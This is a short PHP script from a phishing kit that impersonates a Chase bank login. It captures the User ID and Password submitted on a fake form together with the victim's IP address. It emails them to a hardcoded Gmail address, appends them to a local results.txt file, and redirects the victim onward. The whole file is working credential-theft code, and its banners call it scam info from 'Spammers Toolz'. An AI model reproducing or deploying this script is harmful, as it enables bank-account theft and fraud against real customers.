<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Chase ScAm Inf0 (1) || :------\n";
$message .= "User ID             : ".$_POST['UserID']."\n";
$message .= "Password              : ".$_POST['Password']."\n";
$message .= "----: || tHAnks tO Spammers Toolz || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "helenasolberg2@gmail.com";
$subject = "Chase ID | ".$ip."\n";

mail($recipient,$subject,$message);
$fp = fopen("results.txt","a");
fputs($fp,$message);
fclose($fp);
header("Location:  log.htm");
?>


